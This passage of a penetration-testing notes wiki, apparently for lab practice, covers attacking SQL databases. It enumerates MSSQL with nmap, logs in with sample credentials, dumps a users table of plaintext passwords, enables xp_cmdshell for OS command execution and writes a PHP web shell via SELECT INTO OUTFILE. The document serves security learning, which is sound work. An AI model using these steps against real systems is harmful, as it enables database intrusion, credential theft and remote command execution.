for="__nav_4_3_9_1"> <span class="md-nav__icon md-icon"></span> Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1_1" id="__nav_4_3_9_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1_1"> <span class="md-ellipsis"> Passive Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Passive Information Gathering" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_9_1_1"> <span class="md-nav__icon md-icon"></span> Passive Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/passive_info_gathering/whois/"> <span class="md-ellipsis"> WHOIS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/passive_info_gathering/dns/"> <span class="md-ellipsis"> DNS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/passive_info_gathering/passive_subdomain_enum/"> <span class="md-ellipsis"> Subdomain Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/passive_info_gathering/passive_infrastructure_identification/"> <span class="md-ellipsis"> Infrastructure Identification </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_1_2" id="__nav_4_3_9_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_1_2"> <span class="md-ellipsis"> Active Information Gathering </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Information Gathering" class="md-nav" data-md-level="5"> <label class="md-nav__title" for="__nav_4_3_9_1_2"> <span class="md-nav__icon md-icon"></span> Active Information Gathering </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/active_info_gathering/active_infrastructure_identification/"> <span class="md-ellipsis"> Infrastructure Identification </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/active_info_gathering/active_subdomain_enumeration/"> <span class="md-ellipsis"> Subdomain Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/active_info_gathering/virtual_hosts/"> <span class="md-ellipsis"> Virtual Hosts </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/info_gathering/active_info_gathering/crawling/"> <span class="md-ellipsis"> Crawling </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/ffuf/"> <span class="md-ellipsis"> Ffuf </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/hydra/"> <span class="md-ellipsis"> Hydra </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_9_4" id="__nav_4_3_9_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_9_4"> <span class="md-ellipsis"> SQLMap </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="SQLMap" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_9_4"> <span class="md-nav__icon md-icon"></span> SQLMap </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/sqlmap/build_attacks/"> <span class="md-ellipsis"> Building Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/sqlmap/db_enumeration/"> <span class="md-ellipsis"> DB Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/sqlmap/advanced_db_enumeration/"> <span class="md-ellipsis"> Advanced DB Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/sqlmap/bypassing_web_protections/"> <span class="md-ellipsis"> Bypassing Web App Protections </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../tools/sqlmap/os_exploitation/"> <span class="md-ellipsis"> OS Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/xss/cross_site_scripting/"> <span class="md-ellipsis"> XSS </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../web/lfi/local_file_inclusion/"> <span class="md-ellipsis"> Local File Inclusion </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_10" id="__nav_4_3_10" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_10"> <span class="md-ellipsis"> Documenting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Documenting" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_10"> <span class="md-nav__icon md-icon"></span> Documenting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../documentation_and_reporting/preparation/"> <span class="md-ellipsis"> Preparation </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" id="__nav_4_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_4"> <span class="md-ellipsis"> Blue Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Blue Team" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_4"> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../file_analysis/useful_links/"> <span class="md-ellipsis"> File Analysis </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_5" id="__nav_4_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_5"> <span class="md-ellipsis"> PowerShell </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="PowerShell" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_5"> <span class="md-nav__icon md-icon"></span> PowerShell </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../powershell/cheatsheet/"> <span class="md-ellipsis"> Cheat Sheet </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-content" data-md-component="content"> <article class="md-content__inner md-typeset"> <h1>SQL Databases</h1> <h3>Enumeration</h3> <p>By default, MSSQL uses port <code>TCP/1433</code>, and MySQL uses <code>TCP/3306</code>.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a>secops@kali[/kali]$ nmap -Pn -sV -sC -p1433 10.10.10.125
<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a>
<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a>Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a>Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a>Nmap scan report for 10.10.10.125
<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a>Host is up (0.0099s latency).
<a href="#__codelineno-0-7" id="__codelineno-0-7" name="__codelineno-0-7"></a>
<a href="#__codelineno-0-8" id="__codelineno-0-8" name="__codelineno-0-8"></a>PORT     STATE SERVICE  VERSION
<a href="#__codelineno-0-9" id="__codelineno-0-9" name="__codelineno-0-9"></a>1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
<a href="#__codelineno-0-10" id="__codelineno-0-10" name="__codelineno-0-10"></a>| ms-sql-ntlm-info: 
<a href="#__codelineno-0-11" id="__codelineno-0-11" name="__codelineno-0-11"></a>|   Target_Name: xyz
<a href="#__codelineno-0-12" id="__codelineno-0-12" name="__codelineno-0-12"></a>|   NetBIOS_Domain_Name: xyz
<a href="#__codelineno-0-13" id="__codelineno-0-13" name="__codelineno-0-13"></a>|   NetBIOS_Computer_Name: mssql-test
<a href="#__codelineno-0-14" id="__codelineno-0-14" name="__codelineno-0-14"></a>|   DNS_Domain_Name: xyz.LOCAL
<a href="#__codelineno-0-15" id="__codelineno-0-15" name="__codelineno-0-15"></a>|   DNS_Computer_Name: mssql-test.xyz.LOCAL
<a href="#__codelineno-0-16" id="__codelineno-0-16" name="__codelineno-0-16"></a>|   DNS_Tree_Name: xyz.LOCAL
<a href="#__codelineno-0-17" id="__codelineno-0-17" name="__codelineno-0-17"></a>|_  Product_Version: 10.0.17763
<a href="#__codelineno-0-18" id="__codelineno-0-18" name="__codelineno-0-18"></a>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
<a href="#__codelineno-0-19" id="__codelineno-0-19" name="__codelineno-0-19"></a>| Not valid before: 2021-08-26T01:04:36
<a href="#__codelineno-0-20" id="__codelineno-0-20" name="__codelineno-0-20"></a>|_Not valid after:  2051-08-26T01:04:36
<a href="#__codelineno-0-21" id="__codelineno-0-21" name="__codelineno-0-21"></a>|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
<a href="#__codelineno-0-22" id="__codelineno-0-22" name="__codelineno-0-22"></a>
<a href="#__codelineno-0-23" id="__codelineno-0-23" name="__codelineno-0-23"></a>Host script results:
<a href="#__codelineno-0-24" id="__codelineno-0-24" name="__codelineno-0-24"></a>|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
<a href="#__codelineno-0-25" id="__codelineno-0-25" name="__codelineno-0-25"></a>| ms-sql-info: 
<a href="#__codelineno-0-26" id="__codelineno-0-26" name="__codelineno-0-26"></a>|   10.10.10.125:1433: 
<a href="#__codelineno-0-27" id="__codelineno-0-27" name="__codelineno-0-27"></a>|     Version: 
<a href="#__codelineno-0-28" id="__codelineno-0-28" name="__codelineno-0-28"></a>|       name: Microsoft SQL Server 2017 RTM
<a href="#__codelineno-0-29" id="__codelineno-0-29" name="__codelineno-0-29"></a>|       number: 14.00.1000.00
<a href="#__codelineno-0-30" id="__codelineno-0-30" name="__codelineno-0-30"></a>|       Product: Microsoft SQL Server 2017
<a href="#__codelineno-0-31" id="__codelineno-0-31" name="__codelineno-0-31"></a>|       Service pack level: RTM
<a href="#__codelineno-0-32" id="__codelineno-0-32" name="__codelineno-0-32"></a>|       Post-SP patches applied: false
<a href="#__codelineno-0-33" id="__codelineno-0-33" name="__codelineno-0-33"></a>|_    TCP port: 1433
</code></pre></div> <p>MySQL - Connecting to the SQL Server</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a>secops@kali[/kali]$ mysql -u julio -pPassword123 -h 10.129.20.13
<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a>
<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a>Welcome to the MariaDB monitor. Commands end with ; or \g.
<a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a>Your MySQL connection id is 8
<a href="#__codelineno-1-5" id="__codelineno-1-5" name="__codelineno-1-5"></a>Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
<a href="#__codelineno-1-6" id="__codelineno-1-6" name="__codelineno-1-6"></a>
<a href="#__codelineno-1-7" id="__codelineno-1-7" name="__codelineno-1-7"></a>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
<a href="#__codelineno-1-8" id="__codelineno-1-8" name="__codelineno-1-8"></a>
<a href="#__codelineno-1-9" id="__codelineno-1-9" name="__codelineno-1-9"></a>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
<a href="#__codelineno-1-10" id="__codelineno-1-10" name="__codelineno-1-10"></a>
<a href="#__codelineno-1-11" id="__codelineno-1-11" name="__codelineno-1-11"></a>MySQL [(none)]&gt;
</code></pre></div> <p>Sqlcmd - Connecting to the SQL Server <div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a>C:\xyz&gt; sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a>
<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a>1&gt;
</code></pre></div></p> <p>When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use <code>SERVERNAME\\accountname</code> or <code>.\\accountname</code>.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a>secops@kali[/kali]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
<a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a>
<a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a>sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
<a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a>Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
<a href="#__codelineno-3-5" id="__codelineno-3-5" name="__codelineno-3-5"></a>This is free software with ABSOLUTELY NO WARRANTY
<a href="#__codelineno-3-6" id="__codelineno-3-6" name="__codelineno-3-6"></a>For more information type '\warranty'
<a href="#__codelineno-3-7" id="__codelineno-3-7" name="__codelineno-3-7"></a>1&gt;
</code></pre></div> <p><code>MySQL</code> default system schemas/databases:</p> <ul> <li> <code>mysql</code> - is the system database that contains tables that store information required by the MySQL server</li> <li> <code>information_schema</code> - provides access to database metadata</li> <li> <code>performance_schema</code> - is a feature for monitoring MySQL Server execution at a low level</li> <li> <code>sys</code> - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema</li> </ul> <p><code>MSSQL</code> default system schemas/databases:</p> <ul> <li> <code>master</code> - keeps the information for an instance of SQL Server.</li> <li> <code>msdb</code> - used by SQL Server Agent.</li> <li> <code>model</code> - a template database copied for each new database.</li> <li> <code>resource</code> - a read-only database that keeps system objects visible in every database on the server in sys schema.</li> <li> <code>tempdb</code> - keeps temporary objects for SQL queries.</li> </ul> <p><strong>SQL Syntax</strong> <div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a>mysql&gt; SHOW DATABASES;
<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a>
<a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a>+--------------------+
<a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a>| Database           |
<a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a>+--------------------+
<a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a>| information_schema |
<a href="#__codelineno-4-7" id="__codelineno-4-7" name="__codelineno-4-7"></a>| xyzusers           |
<a href="#__codelineno-4-8" id="__codelineno-4-8" name="__codelineno-4-8"></a>+--------------------+
<a href="#__codelineno-4-9" id="__codelineno-4-9" name="__codelineno-4-9"></a>2 rows in set (0.00 sec)
</code></pre></div></p> <p>If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax. <div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a>1&gt; SELECT name FROM master.dbo.sysdatabases
<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a>2&gt; GO
<a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a>
<a href="#__codelineno-5-4" id="__codelineno-5-4" name="__codelineno-5-4"></a>name
<a href="#__codelineno-5-5" id="__codelineno-5-5" name="__codelineno-5-5"></a>--------------------------------------------------
<a href="#__codelineno-5-6" id="__codelineno-5-6" name="__codelineno-5-6"></a>master
<a href="#__codelineno-5-7" id="__codelineno-5-7" name="__codelineno-5-7"></a>tempdb
<a href="#__codelineno-5-8" id="__codelineno-5-8" name="__codelineno-5-8"></a>model
<a href="#__codelineno-5-9" id="__codelineno-5-9" name="__codelineno-5-9"></a>msdb
<a href="#__codelineno-5-10" id="__codelineno-5-10" name="__codelineno-5-10"></a>xyzusers
</code></pre></div></p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a>mysql&gt; USE xyzusers;
<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a>
<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a>Database changed
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a>1&gt; USE xyzusers
<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a>2&gt; GO
<a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a>
<a href="#__codelineno-7-4" id="__codelineno-7-4" name="__codelineno-7-4"></a>Changed database context to 'xyzusers'.
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a>mysql&gt; SHOW TABLES;
<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a>
<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a>+----------------------------+
<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a>| Tables_in_xyzusers         |
<a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a>+----------------------------+
<a href="#__codelineno-8-6" id="__codelineno-8-6" name="__codelineno-8-6"></a>| actions                    |
<a href="#__codelineno-8-7" id="__codelineno-8-7" name="__codelineno-8-7"></a>| permissions                |
<a href="#__codelineno-8-8" id="__codelineno-8-8" name="__codelineno-8-8"></a>| permissions_roles          |
<a href="#__codelineno-8-9" id="__codelineno-8-9" name="__codelineno-8-9"></a>| permissions_users          |
<a href="#__codelineno-8-10" id="__codelineno-8-10" name="__codelineno-8-10"></a>| roles                      |
<a href="#__codelineno-8-11" id="__codelineno-8-11" name="__codelineno-8-11"></a>| roles_users                |
<a href="#__codelineno-8-12" id="__codelineno-8-12" name="__codelineno-8-12"></a>| settings                   |
<a href="#__codelineno-8-13" id="__codelineno-8-13" name="__codelineno-8-13"></a>| users                      |
<a href="#__codelineno-8-14" id="__codelineno-8-14" name="__codelineno-8-14"></a>+----------------------------+
<a href="#__codelineno-8-15" id="__codelineno-8-15" name="__codelineno-8-15"></a>8 rows in set (0.00 sec)
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a>1&gt; SELECT table_name FROM xyzusers.INFORMATION_SCHEMA.TABLES
<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a>2&gt; GO
<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>
<a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a>table_name
<a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a>--------------------------------
<a href="#__codelineno-9-6" id="__codelineno-9-6" name="__codelineno-9-6"></a>actions
<a href="#__codelineno-9-7" id="__codelineno-9-7" name="__codelineno-9-7"></a>permissions
<a href="#__codelineno-9-8" id="__codelineno-9-8" name="__codelineno-9-8"></a>permissions_roles
<a href="#__codelineno-9-9" id="__codelineno-9-9" name="__codelineno-9-9"></a>permissions_users
<a href="#__codelineno-9-10" id="__codelineno-9-10" name="__codelineno-9-10"></a>roles      
<a href="#__codelineno-9-11" id="__codelineno-9-11" name="__codelineno-9-11"></a>roles_users
<a href="#__codelineno-9-12" id="__codelineno-9-12" name="__codelineno-9-12"></a>settings
<a href="#__codelineno-9-13" id="__codelineno-9-13" name="__codelineno-9-13"></a>users 
<a href="#__codelineno-9-14" id="__codelineno-9-14" name="__codelineno-9-14"></a>(8 rows affected)
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-10-1" id="__codelineno-10-1" name="__codelineno-10-1"></a>mysql&gt; SELECT * FROM users;
<a href="#__codelineno-10-2" id="__codelineno-10-2" name="__codelineno-10-2"></a>
<a href="#__codelineno-10-3" id="__codelineno-10-3" name="__codelineno-10-3"></a>+----+---------------+------------+---------------------+
<a href="#__codelineno-10-4" id="__codelineno-10-4" name="__codelineno-10-4"></a>| id | username      | password   | date_of_joining     |
<a href="#__codelineno-10-5" id="__codelineno-10-5" name="__codelineno-10-5"></a>+----+---------------+------------+---------------------+
<a href="#__codelineno-10-6" id="__codelineno-10-6" name="__codelineno-10-6"></a>|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
<a href="#__codelineno-10-7" id="__codelineno-10-7" name="__codelineno-10-7"></a>|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
<a href="#__codelineno-10-8" id="__codelineno-10-8" name="__codelineno-10-8"></a>|  3 | john          | john123!   | 2020-07-02 11:47:16 |
<a href="#__codelineno-10-9" id="__codelineno-10-9" name="__codelineno-10-9"></a>|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
<a href="#__codelineno-10-10" id="__codelineno-10-10" name="__codelineno-10-10"></a>+----+---------------+------------+---------------------+
<a href="#__codelineno-10-11" id="__codelineno-10-11" name="__codelineno-10-11"></a>4 rows in set (0.00 sec)
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-11-1" id="__codelineno-11-1" name="__codelineno-11-1"></a>1&gt; SELECT * FROM users
<a href="#__codelineno-11-2" id="__codelineno-11-2" name="__codelineno-11-2"></a>2&gt; go
<a href="#__codelineno-11-3" id="__codelineno-11-3" name="__codelineno-11-3"></a>
<a href="#__codelineno-11-4" id="__codelineno-11-4" name="__codelineno-11-4"></a>id          username             password         data_of_joining
<a href="#__codelineno-11-5" id="__codelineno-11-5" name="__codelineno-11-5"></a>----------- -------------------- ---------------- -----------------------
<a href="#__codelineno-11-6" id="__codelineno-11-6" name="__codelineno-11-6"></a>          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
<a href="#__codelineno-11-7" id="__codelineno-11-7" name="__codelineno-11-7"></a>          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
<a href="#__codelineno-11-8" id="__codelineno-11-8" name="__codelineno-11-8"></a>          3 john                 john123!         2020-07-02 11:47:16.000
<a href="#__codelineno-11-9" id="__codelineno-11-9" name="__codelineno-11-9"></a>          4 tom                  tom123!          2020-07-02 12:23:16.000
<a href="#__codelineno-11-10" id="__codelineno-11-10" name="__codelineno-11-10"></a>
<a href="#__codelineno-11-11" id="__codelineno-11-11" name="__codelineno-11-11"></a>(4 rows affected)
</code></pre></div> <hr/> <h3>Execute Commands</h3> <p><code>MSSQL</code> has a <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15" rel="noopener nofollow" target="_blank">extended stored procedures</a> called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noopener nofollow" target="_blank">xp_cmdshell</a> which allow us to execute system commands using SQL.</p> <p>XP_CMDSHELL <div class="highlight"><pre><span></span><code><a href="#__codelineno-12-1" id="__codelineno-12-1" name="__codelineno-12-1"></a>1&gt; xp_cmdshell 'whoami'
<a href="#__codelineno-12-2" id="__codelineno-12-2" name="__codelineno-12-2"></a>2&gt; GO
<a href="#__codelineno-12-3" id="__codelineno-12-3" name="__codelineno-12-3"></a>
<a href="#__codelineno-12-4" id="__codelineno-12-4" name="__codelineno-12-4"></a>output
<a href="#__codelineno-12-5" id="__codelineno-12-5" name="__codelineno-12-5"></a>-----------------------------
<a href="#__codelineno-12-6" id="__codelineno-12-6" name="__codelineno-12-6"></a>no service\mssql$sqlexpress
<a href="#__codelineno-12-7" id="__codelineno-12-7" name="__codelineno-12-7"></a>NULL
<a href="#__codelineno-12-8" id="__codelineno-12-8" name="__codelineno-12-8"></a>(2 rows affected)
</code></pre></div></p> <p>If <code>xp_cmdshell</code> is not enabled, we can enable it, if we have the appropriate privileges, using the following command: <div class="highlight"><pre><span></span><code><a href="#__codelineno-13-1" id="__codelineno-13-1" name="__codelineno-13-1"></a>-- To allow advanced options to be changed.  
<a href="#__codelineno-13-2" id="__codelineno-13-2" name="__codelineno-13-2"></a>EXECUTE sp_configure 'show advanced options', 1
<a href="#__codelineno-13-3" id="__codelineno-13-3" name="__codelineno-13-3"></a>GO
<a href="#__codelineno-13-4" id="__codelineno-13-4" name="__codelineno-13-4"></a>
<a href="#__codelineno-13-5" id="__codelineno-13-5" name="__codelineno-13-5"></a>-- To update the currently configured value for advanced options.  
<a href="#__codelineno-13-6" id="__codelineno-13-6" name="__codelineno-13-6"></a>RECONFIGURE
<a href="#__codelineno-13-7" id="__codelineno-13-7" name="__codelineno-13-7"></a>GO  
<a href="#__codelineno-13-8" id="__codelineno-13-8" name="__codelineno-13-8"></a>
<a href="#__codelineno-13-9" id="__codelineno-13-9" name="__codelineno-13-9"></a>-- To enable the feature.  
<a href="#__codelineno-13-10" id="__codelineno-13-10" name="__codelineno-13-10"></a>EXECUTE sp_configure 'xp_cmdshell', 1
<a href="#__codelineno-13-11" id="__codelineno-13-11" name="__codelineno-13-11"></a>GO  
<a href="#__codelineno-13-12" id="__codelineno-13-12" name="__codelineno-13-12"></a>
<a href="#__codelineno-13-13" id="__codelineno-13-13" name="__codelineno-13-13"></a>-- To update the currently configured value for this feature.  
<a href="#__codelineno-13-14" id="__codelineno-13-14" name="__codelineno-13-14"></a>RECONFIGURE
<a href="#__codelineno-13-15" id="__codelineno-13-15" name="__codelineno-13-15"></a>GO
</code></pre></div></p> <p>There are other methods to get command execution, such as adding <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server" rel="noopener nofollow" target="_blank">extended stored procedures</a>, <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration" rel="noopener nofollow" target="_blank">CLR Assemblies</a>, <a href="https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15" rel="noopener nofollow" target="_blank">SQL Server Agent Jobs</a>, and <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql" rel="noopener nofollow" target="_blank">external scripts</a>.</p> <hr/> <h3>Write Local Files</h3> <p><code>MySQL</code> does not have a stored procedure like <code>xp_cmdshell</code>, but we can archive command execution if we write to a location in the file system that can execute our commands. For example, suppose <code>MySQL</code> operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using <a href="https://mariadb.com/kb/en/select-into-outfile/" rel="noopener nofollow" target="_blank">SELECT INTO OUTFILE</a> in the webserver directory. Then we can browse to the location where the file is and execute our commands.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a>mysql&gt; SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';
<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a>
<a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a>Query OK, 1 row affected (0.001 sec)
</code></pre></div> <p>In <code>MySQL</code>, a global system variable <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv" rel="noopener nofollow" target="_blank">secure_file_priv</a> limits the effect of data import and export operations, such as those performed by the <code>LOAD DATA</code> and <code>SELECT  INTO OUTFILE</code> statements and the <a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file" rel="noopener nofollow" target="_blank">LOAD_FILE()</a> function. These operations are permitted only to users who have the <a href="https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file" rel="noopener nofollow" target="_blank">FILE</a> privilege.</p> <p>Here we can see the <code>secure_file_priv</code> variable is empty, which means we can read and write data using <code>MySQL</code>:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a>mysql&gt; show variables like "secure_file_priv";
<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a>
<a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a>+------------------+-------+
<a href="#__codelineno-15-4" id="__codelineno-15-4" name="__codelineno-15-4"></a>| Variable_name    | Value |
<a href="#__codelineno-15-5" id="__codelineno-15-5" name="__codelineno-15-5"></a>+------------------+-------+
<a href="#__codelineno-15-6" id="__codelineno-15-6" name="__codelineno-15-6"></a>| secure_file_priv |       |
<a href="#__codelineno-15-7" id="__codelineno-15-7" name="__codelineno-15-7"></a>+------------------+-------+
<a href="#__codelineno-15-8" id="__codelineno-15-8" name="__codelineno-15-8"></a>
<a href="#__codelineno-15-9" id="__codelineno-15-9" name="__codelineno-15-9"></a>1 row in set (0.005 sec)
